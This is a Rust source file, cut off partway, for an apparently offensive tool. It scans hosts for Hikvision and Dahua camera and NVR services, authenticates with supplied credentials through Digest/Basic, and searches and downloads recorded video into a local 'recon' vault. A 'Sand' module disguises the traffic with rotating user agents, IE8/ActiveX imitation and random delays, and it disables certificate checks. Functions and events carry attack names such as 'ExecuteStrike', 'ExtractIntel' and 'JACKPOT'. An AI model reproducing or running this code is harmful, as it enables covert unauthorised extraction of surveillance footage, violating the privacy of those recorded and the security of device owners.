use tokio::sync::mpsc;
use std::time::{Duration, Instant};
use regex::Regex;
use chrono::Utc;
use digest_auth::AuthContext;

// =============================================================================
// 0. ⏳ МОДУЛЬ «ПЕСОК» (Sand Engine)
// =============================================================================

/// PRNG на xorshift64 — без внешних зависимостей
struct SandRng { state: u64 }

impl SandRng {
    fn new() -> Self {
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default().as_nanos() as u64;
        Self { state: seed ^ 0xDEAD_BEEF_CAFE_BABE }
    }
    fn next_u64(&mut self) -> u64 {
        let mut x = self.state;
        x ^= x << 13; x ^= x >> 7; x ^= x << 17;
        self.state = x; x
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        if hi <= lo { return lo; }
        lo + (self.next_u64() % (hi - lo))
    }
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.range(0, items.len() as u64) as usize]
    }
}

#[derive(Debug, Clone)]
struct SandProfile {
    chunk_min: u64, chunk_max: u64,
    delay_min_ms: u64, delay_max_ms: u64,
    api_delay_min_ms: u64, api_delay_max_ms: u64,
    task_delay_min_ms: u64, task_delay_max_ms: u64,
}

impl SandProfile {
    fn standard() -> Self {
        Self {
            chunk_min: 512 * 1024, chunk_max: 2 * 1024 * 1024,
            delay_min_ms: 120, delay_max_ms: 600,
            api_delay_min_ms: 200, api_delay_max_ms: 800,
            task_delay_min_ms: 1500, task_delay_max_ms: 4000,
        }
    }
}

/// IE-совместимые UA для Азгура камер (ActiveX-маскировка)
const IE_UA: &str = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)";

/// Ротационный пул UA для стандартных портов (80/443/8080)
const UA_POOL: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
];

const ACCEPT_LANG_POOL: &[&str] = &[
    "en-US,en;q=0.9", "ru-RU,ru;q=0.9,en-US;q=0.8", "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.7",
];

fn build_sand_client(rng: &mut SandRng, timeout_secs: u64) -> Result<reqwest::Client, String> {
    let ua = rng.pick(UA_POOL);
    reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .user_agent(*ua)
        .build().map_err(|e| e.to_string())
}

/// Построить клиент, имитирующий IE8 + ActiveX WebVideoPlugin
fn build_ie_client(timeout_secs: u64) -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .user_agent(IE_UA)
        .build().map_err(|e| e.to_string())
}

fn apply_sand_headers(rng: &mut SandRng, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    let lang = rng.pick(ACCEPT_LANG_POOL);
    let accept = match rng.range(0, 3) {
        0 => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        1 => "*/*",
        _ => "video/mp4,video/*;q=0.9,*/*;q=0.5",
    };
    req.header("Accept-Language", *lang).header("Accept", accept)
       .header("Cache-Control", "no-cache").header("DNT", "1")
}

/// Заголовки для bootstrap-запроса на порт 2019 (получение nonce).
/// БЕЗ Cookie — иначе камера думает мы уже залогинены и не выдаёт challenge.
/// User-Agent задаётся ЯВНО через header (не через builder) — как в ActiveX.
fn apply_ie_bootstrap(req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("X-Requested-With", "XMLHttpRequest")
       .header("User-Agent", IE_UA)
       .header("Accept", "application/xml, text/xml, */*")
       .header("Connection", "keep-alive")
}

/// Заголовки для авторизованного запроса (после получения nonce).
/// Cookie: WebSession=Guest — имитация залогиненной IE-сессии.
fn apply_ie_auth(req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
    req.header("X-Requested-With", "XMLHttpRequest")
       .header("User-Agent", IE_UA)
       .header("Accept", "application/xml, text/xml, */*")
       .header("Cookie", "WebSession=Guest")
       .header("Connection", "keep-alive")
}

async fn sand_sleep(rng: &mut SandRng, min_ms: u64, max_ms: u64, tx: &mpsc::Sender<HyperionEvent>, label: &str) {
    let ms = rng.range(min_ms, max_ms);
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("⏳ [SAND] {} — {}ms", label, ms),
    }).await;
    tokio::time::sleep(Duration::from_millis(ms)).await;
}


// =============================================================================
// 1. DIGEST AUTH ENGINE — сердце протокола для порта 2019
// =============================================================================

/// Выполнить HTTP-запрос с Digest-авторизацией + IE-маскировкой.
///
/// Алгоритм (имитация WebVideoActiveX.ocx):
/// 1. Отправляем пустой запрос с заголовками IE → получаем 401 + WWW-Authenticate (nonce)
/// 2. Парсим nonce, вычисляем MD5-ответ через digest_auth
/// 3. Отправляем повторный запрос с Authorization: Digest ...
///
/// Если endpoint НЕ на порту 2019 — используем basic_auth как fallback.
async fn digest_request(
    client: &reqwest::Client,
    method: reqwest::Method,
    url: &str,
    path: &str,
    login: &str,
    pass: &str,
    body: Option<String>,
    _tx: &mpsc::Sender<HyperionEvent>,
) -> Result<reqwest::Response, String> {
    let is_2019 = url.contains(":2019");

    // === ШАГ 1: Получаем challenge (nonce) через пустой запрос ===
    // Для ВСЕХ портов начинаем с запроса без auth — чтобы получить WWW-Authenticate
    // Для 2019: обязательно с IE-заголовками
    // Для стандартных: можно с basic_auth, но если 401 — нужен Digest

    let bootstrap = if is_2019 {
        // Порт 2019: IE-маска обязательна, basic auth не работает
        apply_ie_bootstrap(client.request(method.clone(), url))
            .send().await
            .map_err(|e| format!("Bootstrap 2019: {}", e))?
    } else {
        // Стандартные порты: пробуем basic auth
        let mut req = client.request(method.clone(), url).basic_auth(login, Some(pass));
        if let Some(ref payload) = body {
            req = req.header("Content-Type", "application/xml; charset=UTF-8").body(payload.clone());
        }
        req.send().await.map_err(|e| format!("Bootstrap std: {}", e))?
    };

    let status = bootstrap.status().as_u16();

    // Если не 401 — Digest не требуется (или Basic сработал, или ошибка)
    if status != 401 {
        return Ok(bootstrap);
    }

    // === ШАГ 2: Получен 401 — извлекаем WWW-Authenticate для Digest ===
    let auth_header = bootstrap.headers()
        .get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());

    // Потребляем тело bootstrap (нужно чтобы connection освободился)
    let _ = bootstrap.text().await;

    let auth_header = auth_header
        .ok_or_else(|| format!("Digest: 401 без WWW-Authenticate на {}", url))?;

    // Проверяем что это действительно Digest, а не Basic challenge
    if !auth_header.to_lowercase().contains("digest") {
        // Сервер хочет Basic auth, но мы его уже отправили (для std портов)
        // Значит пароль неверный
        return Err(format!("Auth rejected: {} (не Digest)", auth_header.chars().take(60).collect::<String>()));
    }

    // === ШАГ 3: Вычисляем Digest-ответ ===
    let mut prompt = digest_auth::parse(&auth_header)
        .map_err(|e| format!("Digest parse: {:?}", e))?;
    let context = AuthContext::new(login.to_string(), pass.to_string(), path);
    let answer = prompt.respond(&context)
        .map_err(|e| format!("Digest respond: {:?}", e))?;

    // === ШАГ 4: Финальный авторизованный запрос ===
    let mut req = apply_ie_auth(
        client.request(method, url)
            .header("Authorization", answer.to_string())
    );
    if let Some(payload) = body {
        req = req.header("Content-Type", "application/xml; charset=UTF-8").body(payload);
    }

    req.send().await.map_err(|e| format!("Digest final: {}", e))
}

/// Digest-запрос для скачивания (возвращает Response со стримом для чтения тела)
async fn digest_download_request(
    client: &reqwest::Client,
    url: &str,
    path: &str,
    login: &str,
    pass: &str,
    extra_headers: Vec<(&str, String)>,
    _tx: &mpsc::Sender<HyperionEvent>,
) -> Result<reqwest::Response, String> {
    let is_2019 = url.contains(":2019");

    // Шаг 1: bootstrap
    let bootstrap = if is_2019 {
        let mut req = apply_ie_bootstrap(client.get(url));
        for (k, v) in &extra_headers { req = req.header(*k, v); }
        req.send().await.map_err(|e| format!("DL bootstrap 2019: {}", e))?
    } else {
        let mut req = client.get(url).basic_auth(login, Some(pass));
        for (k, v) in &extra_headers { req = req.header(*k, v); }
        req.send().await.map_err(|e| format!("DL bootstrap std: {}", e))?
    };

    if bootstrap.status().as_u16() != 401 {
        return Ok(bootstrap);
    }

    // Шаг 2: Digest
    let auth_header = bootstrap.headers()
        .get(reqwest::header::WWW_AUTHENTICATE)
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());
    let _ = bootstrap.text().await;

    let auth_header = auth_header.ok_or("DL Digest: нет WWW-Authenticate")?;
    let mut prompt = digest_auth::parse(&auth_header).map_err(|e| format!("DL Digest parse: {:?}", e))?;
    let context = AuthContext::new(login.to_string(), pass.to_string(), path);
    let answer = prompt.respond(&context).map_err(|e| format!("DL Digest respond: {:?}", e))?;

    let mut req = apply_ie_auth(
        client.get(url).header("Authorization", answer.to_string())
    );
    for (k, v) in &extra_headers { req = req.header(*k, v); }

    req.send().await.map_err(|e| format!("DL Digest final: {}", e))
}


// =============================================================================
// 2. ПРОТОКОЛ СВЯЗИ
// =============================================================================

#[derive(Debug, Clone)]
pub enum HyperionEvent {
    TargetDiscovered { ip: String, port: u16, login: String, pass: String },
    AnalyzeTarget { ip: String, port: u16, login: String, pass: String },
    TargetAnalyzed {
        ip: String, port: u16, login: String, pass: String,
        vendor: NvrVendor, open_ports: Vec<u16>,
        isapi_endpoint: Option<String>, onvif_endpoint: Option<String>,
        device_model: Option<String>,
        camera_time_offset: Option<i32>, // смещение в годах относительно UTC
    },
    ExecuteStrike {
        ip: String, port: u16, login: String, pass: String,
        vendor: NvrVendor,
        isapi_endpoint: Option<String>, onvif_endpoint: Option<String>,
        camera_time_offset: Option<i32>,
    },
    ExtractIntel {
        ip: String, login: String, pass: String, vendor: NvrVendor,
        isapi_recordings: Vec<IsapiHit>, onvif_recordings: Vec<OnvifHit>,
    },
    TransportCargo {
        ip: String, login: String, pass: String,
        download_tasks: Vec<DownloadTask>,
    },
    OperationComplete { ip: String, result: String },
    OperationFailed { ip: String, reason: String },
    NexusLog { message: String },
}

#[derive(Debug, Clone, PartialEq)]
pub enum NvrVendor { Hikvision, Dahua, Unknown }

impl std::fmt::Display for NvrVendor {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            NvrVendor::Hikvision => write!(f, "Hikvision"),
            NvrVendor::Dahua => write!(f, "Dahua"),
            NvrVendor::Unknown => write!(f, "Unknown"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct IsapiHit {
    pub endpoint: String, pub track_id: Option<String>,
    pub start_time: Option<String>, pub end_time: Option<String>,
    pub playback_uri: Option<String>,
}

#[derive(Debug, Clone)]
pub struct OnvifHit { pub endpoint: String, pub token: String }

#[derive(Debug, Clone)]
pub enum DownloadTask {
    IsapiPlayback { playback_uri: String, login: String, pass: String, filename_hint: String },
    OnvifToken { endpoint: String, recording_token: String, login: String, pass: String, filename_hint: String },
    RtspCapture { source_url: String, filename_hint: String, duration_seconds: u64 },
}


// =============================================================================
// 3. STANDALONE ОПЕРАЦИИ
// =============================================================================

fn normalize_host(input: &str) -> String {
    input.trim()
        .trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("rtsp://")
        .split('/').next().unwrap_or_default()
        .split(':').next().unwrap_or_default().to_string()
}

fn get_vault_path() -> std::path::PathBuf {
    let p = std::path::PathBuf::from(r"D:\Nemesis_Vault\recon_db");
    if !p.exists() { let _ = std::fs::create_dir_all(&p); }
    p
}

fn sanitize_filename(input: &str) -> String {
    let mut o = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() || ch == '.' || ch == '_' || ch == '-' { o.push(ch); }
        else { o.push('_'); }
    }
    let t = o.trim_matches('_');
    if t.is_empty() { "recording".into() } else { t.to_string() }
}

fn extract_xml_value(xml: &str, tag: &str) -> Option<String> {
    Regex::new(&format!("<{}[^>]*>([^<]+)</{}>", tag, tag)).ok()
        .and_then(|re| re.captures(xml).and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string())))
}

fn generate_search_xml(track_id: &str, from: &str, to: &str) -> String {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription>
    <searchID>1</searchID>
    <trackList><trackID>{}</trackID></trackList>
    <timeSpanList><timeSpan>
        <startTime>{}</startTime><endTime>{}</endTime>
    </timeSpan></timeSpanList>
    <maxResults>40</maxResults>
    <searchResultPostion>0</searchResultPostion>
    <metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</SearchDescription>"#, track_id, from, to)
}

/// Извлечь URI path из полного URL (для Digest AuthContext)
fn url_to_path(url: &str) -> String {
    if let Some(idx) = url.find("://") {
        let rest = &url[idx + 3..];
        if let Some(slash) = rest.find('/') {
            return rest[slash..].to_string();
        }
    }
    "/".to_string()
}


// --- BRAIN ---

async fn scan_ports(host: &str, _tx: &mpsc::Sender<HyperionEvent>) -> Vec<u16> {
    let ports = [21u16, 22, 80, 443, 554, 2019, 8080, 8443];
    let mut open = Vec::new();
    let mut rng = SandRng::new();
    for port in ports {
        let addr = format!("{}:{}", host, port);
        if tokio::time::timeout(Duration::from_millis(900), tokio::net::TcpStream::connect(&addr))
            .await.is_ok_and(|v| v.is_ok())
        { open.push(port); }
        tokio::time::sleep(Duration::from_millis(rng.range(30, 90))).await;
    }
    open
}

/// Пробить ISAPI с правильной авторизацией (Digest для :2019, Basic для остальных)
async fn probe_isapi(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();

    // Порт 2019 первый — целевой для Азгура
    let candidates = vec![
        format!("http://{}:2019/ISAPI/System/deviceInfo", host),
        format!("http://{}:80/ISAPI/System/deviceInfo", host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", host),
        format!("https://{}:443/ISAPI/System/deviceInfo", host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", host),
    ];

    for ep in &candidates {
        let is_2019 = ep.contains(":2019");
        // Порт 2019 медленный — даём 15 сек; стандартные — 8 сек
        let timeout_s = if is_2019 { 15 } else { 8 };
        let client = if is_2019 { build_ie_client(timeout_s) } else { build_sand_client(&mut rng, timeout_s) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        let path = url_to_path(ep);

        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("🔍 [PROBE] Проверяю ISAPI: {} ({})", ep, if is_2019 { "Digest+IE" } else { "Basic" }),
        }).await;

        match digest_request(&client, reqwest::Method::GET, ep, &path, login, pass, None, tx).await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔍 [PROBE] {} → HTTP {}", ep, status),
                }).await;
                // 200 = открыт, 401 = закрыт но ISAPI есть (Digest нужен),
                // 403 = есть но запрещен — тоже считаем обнаружением
                if status == 200 || status == 401 || status == 403 {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔓 [PROBE] ISAPI ОБНАРУЖЕН: {} (HTTP {}{})",
                            ep, status, if is_2019 { " [port 2019]" } else { "" }),
                    }).await;
                    return Some(ep.clone());
                }
            }
            Err(e) => {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔍 [PROBE] {} → ОШИБКА: {}", ep, e),
                }).await;
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ISAPI probe").await;
    }
    None
}

async fn probe_onvif(host: &str, tx: &mpsc::Sender<HyperionEvent>) -> Option<String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();

    let candidates = vec![
        format!("http://{}:80/onvif/device_service", host),
        format!("http://{}:8080/onvif/device_service", host),
        format!("http://{}:2019/onvif/device_service", host),
        format!("https://{}:443/onvif/device_service", host),
    ];

    for ep in &candidates {
        let is_2019 = ep.contains(":2019");
        let timeout_s = if is_2019 { 12 } else { 8 };
        let client = if is_2019 { build_ie_client(timeout_s) } else { build_sand_client(&mut rng, timeout_s) };
        let client = match client { Ok(c) => c, Err(_) => continue };

        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("🔍 [PROBE] Проверяю ONVIF: {}", ep),
        }).await;

        let mut req = client.get(ep.as_str());
        if is_2019 {
            req = apply_ie_bootstrap(req);
        } else {
            req = apply_sand_headers(&mut rng, req);
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔍 [PROBE] {} → HTTP {}", ep, status),
                }).await;
                if status == 200 || status == 401 || status == 403 || status == 405 {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("🔓 [PROBE] ONVIF обнаружен: {} (HTTP {})", ep, status),
                    }).await;
                    return Some(ep.clone());
                }
            }
            Err(e) => {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🔍 [PROBE] {} → ОШИБКА: {}", ep, e),
                }).await;
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF probe").await;
    }
    None
}

/// Определение вендора + модели + проверка часов камеры
async fn fetch_device_info(
    host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> (NvrVendor, Option<String>, Option<i32>) {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();

    // Порты для проб
    let endpoints = vec![
        format!("http://{}:2019/ISAPI/System/deviceInfo", host),
        format!("http://{}:80/ISAPI/System/deviceInfo", host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", host),
    ];

    for url in &endpoints {
        let is_2019 = url.contains(":2019");
        let client = if is_2019 { build_ie_client(8) } else { build_sand_client(&mut rng, 8) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        let path = url_to_path(url);

        if let Ok(resp) = digest_request(&client, reqwest::Method::GET, url, &path, login, pass, None, tx).await {
            if resp.status().is_success() {
                let text = resp.text().await.unwrap_or_default();
                let text_lc = text.to_lowercase();
                let model = extract_xml_value(&text_lc, "model");

                let vendor = if text_lc.contains("hikvision") || text_lc.contains("hikdigital") || text_lc.contains("isapi") {
                    NvrVendor::Hikvision
                } else if text_lc.contains("dahua") || text_lc.contains("dh-") {
                    NvrVendor::Dahua
                } else {
                    // Если ISAPI отвечает — скорее всего Hik-совместимый
                    NvrVendor::Hikvision
                };

                // Проверяем часы камеры
                let time_offset = check_camera_clock(host, login, pass, &client, tx).await;

                return (vendor, model, time_offset);
            }
        }
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "deviceInfo").await;
    }

    // ONVIF fallback
    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body><tds:GetDeviceInformation/></s:Body>
</s:Envelope>"#;

    let client = match build_sand_client(&mut rng, 8) { Ok(c) => c, Err(_) => return (NvrVendor::Unknown, None, None) };

    for url in &[
        format!("http://{}:80/onvif/device_service", host),
        format!("http://{}:8080/onvif/device_service", host),
    ] {
        let req = client.post(url)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login, Some(pass)).body(soap.to_string());
        if let Ok(resp) = req.send().await {
            if resp.status().is_success() {
                let text = resp.text().await.unwrap_or_default().to_lowercase();
                let model = extract_xml_value(&text, "model");
                if text.contains("hikvision") { return (NvrVendor::Hikvision, model, None); }
                if text.contains("dahua") { return (NvrVendor::Dahua, model, None); }
                return (NvrVendor::Unknown, model, None);
            }
        }
    }

    (NvrVendor::Unknown, None, None)
}

/// Проверить часы камеры через /ISAPI/System/time — вернуть смещение в годах
async fn check_camera_clock(
    host: &str, login: &str, pass: &str,
    client: &reqwest::Client, tx: &mpsc::Sender<HyperionEvent>,
) -> Option<i32> {
    // Пробуем порт 2019, затем 80
    for port in &[2019, 80, 8080] {
        let url = format!("http://{}:{}/ISAPI/System/time", host, port);
        let path = "/ISAPI/System/time";

        if let Ok(resp) = digest_request(client, reqwest::Method::GET, &url, path, login, pass, None, tx).await {
            if resp.status().is_success() {
                let body = resp.text().await.unwrap_or_default();
                // Парсим <localTime> или <time>
                let time_re = Regex::new(r"<(?:localTime|time)>([^<]+)</").ok()?;
                let val = time_re.captures(&body)?.get(1)?.as_str().trim();

                // Пробуем распарсить год
                if val.len() >= 4 {
                    if let Ok(cam_year) = val[..4].parse::<i32>() {
                        let now_year = Utc::now().format("%Y").to_string().parse::<i32>().unwrap_or(2026);
                        let skew = now_year - cam_year;
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("🕒 [CLOCK] Камера: {} | Реальный год: {} | Skew: {}y",
                                val, now_year, skew),
                        }).await;
                        if skew.abs() >= 3 {
                            return Some(skew);
                        }
                        return Some(0); // Часы синхронны
                    }
                }
            }
        }
    }
    None
}


// --- SPETSNAZ: ISAPI поиск с Digest + TrackID sweep + Clock sync ---

async fn search_isapi(
    host: &str, login: &str, pass: &str,
    clock_offset: Option<i32>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Vec<IsapiHit> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();

    // Формируем временное окно с учётом часов камеры
    let now_year = Utc::now().format("%Y").to_string().parse::<i32>().unwrap_or(2026);
    let (from, to) = match clock_offset {
        Some(skew) if skew.abs() >= 3 => {
            let cam_year = now_year - skew;
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🕒 [SPETSNAZ] Сдвигаю окно под часы камеры: год камеры ~{}", cam_year),
            }).await;
            (format!("{}-01-01T00:00:00Z", cam_year - 1), format!("{}-12-31T23:59:59Z", cam_year + 1))
        }
        _ => ("2024-01-01T00:00:00Z".to_string(), "2027-12-31T23:59:59Z".to_string()),
    };

    // Endpoints: порт 2019 первый (целевой для Азгура)
    let endpoints = vec![
        format!("http://{}:2019/ISAPI/ContentMgmt/search", host),
        format!("http://{}:80/ISAPI/ContentMgmt/search", host),
        format!("http://{}:8080/ISAPI/ContentMgmt/search", host),
        format!("https://{}:443/ISAPI/ContentMgmt/search", host),
    ];

    // TrackID перебор: 101 (стандарт Hik), 1, 100, 0 (старые Азгуры)
    let track_ids = ["101", "1", "100", "0"];

    let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").unwrap();
    let end_re = Regex::new(r"<endTime>([^<]+)</endTime>").unwrap();
    let track_re = Regex::new(r"<trackID>([^<]+)</trackID>").unwrap();
    let uri_re = Regex::new(r"<playbackURI>([^<]+)</playbackURI>").unwrap();

    for endpoint in &endpoints {
        let is_2019 = endpoint.contains(":2019");
        let client = if is_2019 { build_ie_client(15) } else { build_sand_client(&mut rng, 10) };
        let client = match client { Ok(c) => c, Err(_) => continue };
        let path = url_to_path(endpoint);

        for tid in &track_ids {
            sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, &format!("ISAPI search TID:{}", tid)).await;

            let xml_body = generate_search_xml(tid, &from, &to);

            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🥷 [STRIKE] {} | TrackID:{} | {}..{}", endpoint, tid, &from[..10], &to[..10]),
            }).await;

            match digest_request(
                &client, reqwest::Method::POST, endpoint, &path,
                login, pass, Some(xml_body), tx,
            ).await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let text = resp.text().await.unwrap_or_default();

                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("📡 [TID:{}] HTTP {} | {} chars | preview: {}",
                            tid, status, text.len(),
                            text.chars().take(120).collect::<String>()),
                    }).await;

                    // Ищем записи
                    if text.contains("<playbackURI>") || text.contains("<url>") || text.contains("<mediaSegmentDescriptor>") {
                        let starts: Vec<String> = start_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
                        let ends: Vec<String> = end_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
                        let tracks: Vec<String> = track_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();
                        let uris: Vec<String> = uri_re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| m.as_str().to_string())).collect();

                        let count = [starts.len(), ends.len(), tracks.len(), uris.len()].into_iter().max().unwrap_or(0).min(40);
                        if count > 0 {
                            let _ = tx.send(HyperionEvent::NexusLog {
                                message: format!("🎯 [JACKPOT] {} записей через TID:{} на {}", count, tid, endpoint),
                            }).await;
                            return (0..count).map(|i| IsapiHit {
                                endpoint: endpoint.clone(),
                                track_id: tracks.get(i).cloned(),
                                start_time: starts.get(i).cloned(),
                                end_time: ends.get(i).cloned(),
                                playback_uri: uris.get(i).cloned(),
                            }).collect();
                        }
                    }
                }
                Err(e) => {
                    let _ = tx.send(HyperionEvent::NexusLog {
                        message: format!("❌ [TID:{}] {}: {}", tid, endpoint, e),
                    }).await;
                }
            }
        }
    }
    vec![]
}


// --- SPETSNAZ: ONVIF ---

async fn search_onvif(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Vec<OnvifHit> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 10) { Ok(c) => c, Err(_) => return vec![] };
    let endpoints = vec![
        format!("http://{}:80/onvif/recording_service", host),
        format!("http://{}:8080/onvif/recording_service", host),
        format!("http://{}:2019/onvif/recording_service", host),
        format!("https://{}:443/onvif/recording_service", host),
    ];
    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body><trc:GetRecordings/></s:Body>
</s:Envelope>"#;
    let token_re = Regex::new(r"<[^>]*RecordingToken[^>]*>([^<]+)</[^>]+>").unwrap();

    for endpoint in endpoints {
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF search").await;
        let req = apply_sand_headers(&mut rng,
            client.post(&endpoint)
                .header("Content-Type", "application/soap+xml; charset=utf-8")
                .basic_auth(login, Some(pass))
                .body(soap.to_string()));
        if let Ok(r) = req.send().await {
            if !r.status().is_success() && r.status().as_u16() != 401 { continue; }
            let text = r.text().await.unwrap_or_default();
            let out: Vec<OnvifHit> = token_re.captures_iter(&text)
                .filter_map(|c| c.get(1).map(|m| OnvifHit { endpoint: endpoint.clone(), token: m.as_str().trim().to_string() })).collect();
            if !out.is_empty() { return out; }
        }
    }
    vec![]
}


// =============================================================================
// 4. TRANSPORT + SAND + DIGEST
// =============================================================================

/// Потоковое скачивание ISAPI (fallback когда Range/HEAD не поддерживаются)
async fn sand_download_isapi_stream(
    client: &reqwest::Client,
    playback_uri: &str,
    uri_path: &str,
    login: &str,
    pass: &str,
    filename: &str,
    fpath: &std::path::Path,
    task_key: &str,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    use futures_util::StreamExt;
    let mut rng = SandRng::new();

    let resp = digest_download_request(client, playback_uri, uri_path, login, pass, vec![], tx).await?;
    if !resp.status().is_success() {
        return Err(format!("HTTP {}", resp.status().as_u16()));
    }

    let mut stream = resp.bytes_stream();
    let mut file = std::fs::OpenOptions::new().create(true).write(true).truncate(true)
        .open(fpath).map_err(|e| e.to_string())?;
    let mut written: u64 = 0;
    let mut next_mark: u64 = 2 * 1024 * 1024;

    while let Some(chunk) = stream.next().await {
        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        written += data.len() as u64;
        if written >= next_mark {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, written),
            }).await;
            next_mark += 2 * 1024 * 1024;
            tokio::time::sleep(Duration::from_millis(rng.range(80, 250))).await;
        }
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Stream done: {} ({} bytes)", filename, written),
    }).await;
    Ok(fpath.to_string_lossy().to_string())
}

/// ISAPI скачивание: Digest auth + Sand chunking
async fn sand_download_isapi(
    playback_uri: &str, login: &str, pass: &str,
    filename_hint: &str, tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    use futures_util::StreamExt;

    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let task_key = format!("nexus_isapi_{}", Utc::now().timestamp_millis());
    let is_2019 = playback_uri.contains(":2019");

    let session_ua = if is_2019 { IE_UA.to_string() } else { rng.pick(UA_POOL).to_string() };
    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Сессия {} | {} | Отпечаток: {}",
            task_key, if is_2019 { "Digest+IE" } else { "Standard" },
            session_ua.chars().take(45).collect::<String>()),
    }).await;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
